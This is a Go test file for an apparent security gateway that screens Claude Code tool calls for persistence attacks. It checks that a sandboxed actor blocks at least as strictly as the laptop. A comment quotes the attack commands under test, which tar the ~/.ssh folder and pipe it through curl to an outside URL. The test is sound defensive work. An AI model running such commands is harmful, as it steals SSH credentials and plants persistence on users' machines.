// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

//go:build !windows

package gateway

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/sandboxauth"
)

// gap0922Call is one persistence row of the tool-call corpus, or of
// gap0922_actor_parity.json, as a Claude Code tool call: a Bash command, or
// a structured tool and its input. {home} stands for the home of the call.
type gap0922Call struct {
	name, rule, tool, command string
	input                     json.RawMessage
	attack                    bool
}

// gap0922WindowsOnlyRules are the persistence rules no POSIX shell call
// reaches: their every trigger is a Windows command (reg, copy) of a
// Windows host, and an actor runs only POSIX shells.
var gap0922WindowsOnlyRules = map[string]bool{"persistence.windows_accessibility_feature_hijack": true}

// gap0922Calls reads every POSIX persistence row of the tool-call corpus
// (home /home/alice) with its folder variants: ~/, relative to the home,
// relative after a cd, and after a cd chain back to the home. The GAP-0922
// rows (a tar of ~/.ssh, after cd and cd chains) and their benign tar and
// cd neighbours come from gap0922_actor_parity.json.
func gap0922Calls(t *testing.T) []gap0922Call {
	t.Helper()
	var calls []gap0922Call
	for _, row := range readJSONL[toolCallCorpusCase](t, "toolcall", "corpus.jsonl") {
		if !strings.HasPrefix(row.RuleID, "persistence.") || row.Dialect != "" || row.CWD != "" || row.ActiveHome != "" {
			continue
		}
		if row.Tool != "" && row.Tool != "shell" {
			if row.Command == "" && len(row.Args) > 0 && row.ArgsRaw == "" && row.Tool != "write_file" && row.Tool != "apply_patch" {
				calls = append(calls, gap0922Call{name: row.ID, rule: row.RuleID, tool: row.Tool, input: row.Args, attack: row.IsAttack})
			}
			continue
		}
		if row.Command == "" {
			continue
		}
		command := strings.ReplaceAll(row.Command, "/home/alice/", "{home}/")
		add := func(suffix, text string) {
			calls = append(calls, gap0922Call{name: row.ID + suffix, rule: row.RuleID, tool: "Bash", command: text, attack: row.IsAttack})
		}
		add("", command)
		if strings.Contains(command, "{home}/") {
			add(" ~", strings.ReplaceAll(command, "{home}/", "~/"))
			add(" rel", strings.ReplaceAll(command, "{home}/", ""))
			add(" cd-rel", "cd src && "+strings.ReplaceAll(command, "{home}/", "../"))
		}
		add(" cd-chain", "cd src && cd .. && "+strings.ReplaceAll(command, "{home}/", ""))
	}
	raw, err := os.ReadFile(filepath.Join("testdata", "security_suite", "toolcall", "gap0922_actor_parity.json"))
	if err != nil {
		t.Fatal(err)
	}
	var rows []struct {
		Name, Command string
		Attack        bool
	}
	if err := json.Unmarshal(raw, &rows); err != nil {
		t.Fatal(err)
	}
	for _, row := range rows {
		calls = append(calls, gap0922Call{name: row.Name, rule: "persistence.ssh_authorized_keys_command", tool: "Bash", command: row.Command, attack: row.Attack})
	}
	return calls
}

// gap0922Body is call's hook body in home and cwd.
func gap0922Body(call gap0922Call, home, cwd string) []byte {
	input := call.input
	if call.tool == "Bash" {
		input, _ = json.Marshal(map[string]any{"command": strings.ReplaceAll(call.command, "{home}", home)})
	}
	body, _ := json.Marshal(map[string]any{"hook_event_name": "PreToolUse", "session_id": "gap0922", "cwd": cwd,
		"tool_name": call.tool, "tool_input": input, "tool_use_id": "gap0922"})
	return body
}

// gap0922PackRules lists the persistence rules of pack.
func gap0922PackRules(t *testing.T, pack string) []string {
	t.Helper()
	files, err := filepath.Glob(filepath.Join(guardrailPoliciesRoot(t), pack, "rules", "*.yaml"))
	if err != nil || len(files) == 0 {
		t.Fatalf("rules of %s: %v", pack, err)
	}
	id := regexp.MustCompile(`(?m)^\s*- id:\s*(persistence\.[a-z0-9_]+)\s*$`)
	var rules []string
	for _, file := range files {
		data, err := os.ReadFile(file)
		if err != nil {
			t.Fatal(err)
		}
		for _, m := range id.FindAllStringSubmatch(string(data), -1) {
			rules = append(rules, m[1])
		}
	}
	slices.Sort(rules)
	return slices.Compact(rules)
}

// gap0922Layout adds the folders and files the persistence rows name to the
// J19 home: a Git repository in the home and in project, the shell
// profiles, the SSH keys file and a tarball beside ~/.ssh.
func gap0922Layout(t *testing.T, home string) {
	t.Helper()
	for _, dir := range []string{"src", ".git/hooks", "project/.git/hooks", ".ssh"} {
		if err := os.MkdirAll(filepath.Join(home, dir), 0o700); err != nil {
			t.Fatal(err)
		}
	}
	for _, name := range []string{".zshrc", ".bashrc", ".ssh/authorized_keys", "backup.tgz"} {
		if err := os.WriteFile(filepath.Join(home, name), []byte("x\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
}

// TestGAP0922PersistenceRulesActorNeverWeakerThanLaptop: every persistence
// rule of every pack, from its corpus trigger and its ~/, relative, cd and
// cd-chain variants, is never weaker in a copy-mode actor than on the
// laptop, judged by the gateway alone and with the kit's facts, and a benign
// neighbour is never stronger (substrate-1 GAP-0922: tar cz ~/.ssh, cd .ssh
// && tar cz . and cd src && cd ../.ssh && tar cz . | curl -T - URL were
// allowed in the actor, where the laptop blocks them with
// persistence.ssh_authorized_keys_command).
func TestGAP0922PersistenceRulesActorNeverWeakerThanLaptop(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("requires an unprivileged POSIX gateway")
	}
	claude := gap0545Shapes()[0]
	calls := gap0922Calls(t)
	for _, pack := range []string{"default", "permissive", "strict"} {
		t.Run(pack, func(t *testing.T) {
			api, actor, home, _ := gap0545API(t, "claudecode", pack)
			gap0922Layout(t, home)
			named := map[string]bool{}
			for _, call := range calls {
				host, guest := gap0922Body(call, home, home), gap0922Body(call, sandboxauth.SandboxHome, sandboxauth.SandboxHome)
				la, lr := gap0545Verdict(t, api, context.Background(), claude, host)
				if call.attack && slices.Contains(lr, call.rule) {
					named[call.rule] = true
				}
				facts := gap0545KitFacts(t, "claudecode", "PreToolUse", host, home)
				for _, view := range []struct {
					name string
					ctx  context.Context
				}{
					{"gateway alone", actor},
					{"with kit facts", gap0545Actor(actor, "claudecode", "PreToolUse", guest, facts)},
				} {
					ca, cr := gap0545Verdict(t, api, view.ctx, claude, guest)
					where := fmt.Sprintf("%s (%s, %s)", call.name, call.rule, view.name)
					if call.attack && gap0545Rank(ca, cr) < gap0545Rank(la, lr) {
						t.Errorf("%s: actor %s %v is weaker than the laptop's %s %v", where, ca, cr, la, lr)
					}
					if !call.attack && gap0545Rank(ca, cr) > gap0545Rank(la, lr) {
						t.Errorf("%s: benign: actor %s %v is stronger than the laptop's %s %v", where, ca, cr, la, lr)
					}
					if call.attack && gap0545Rank(la, lr) == 3 {
						for _, rule := range lr {
							if strings.HasPrefix(rule, "persistence.") && !slices.Contains(cr, rule) {
								t.Errorf("%s: actor %s %v does not name the laptop's %s", where, ca, cr, rule)
							}
						}
					}
				}
			}
			for _, rule := range gap0922PackRules(t, pack) {
				if !named[rule] && !gap0922WindowsOnlyRules[rule] {
					t.Errorf("%s: no attack row the laptop names it for (the class is not covered)", rule)
				}
			}
		})
	}
}
